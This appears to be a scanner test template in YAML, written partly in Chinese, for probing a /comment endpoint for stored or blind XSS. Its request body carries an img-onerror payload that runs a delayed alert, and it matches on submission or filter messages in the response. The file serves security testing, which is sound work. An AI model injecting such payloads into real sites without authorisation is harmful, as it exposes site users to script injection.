name: 基于时间的盲注XSS测试
description: 测试基于时间的盲注XSS漏洞
level: 中
author: Test
request:
  method: POST
  path: /comment
  params:
    post_id: "123"
  headers:
    Content-Type: "application/x-www-form-urlencoded"
    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
  body: "comment=<img src=x onerror=setTimeout(function(){alert('XSS')},5000)>&submit=Submit"
response:
  matchType: contains
  successIndicators:
    - "comment submitted"
    - "评论已提交"
  errorIndicators:
    - "invalid input"
    - "input filtered"
    - "输入被过滤"
  statusCode: 200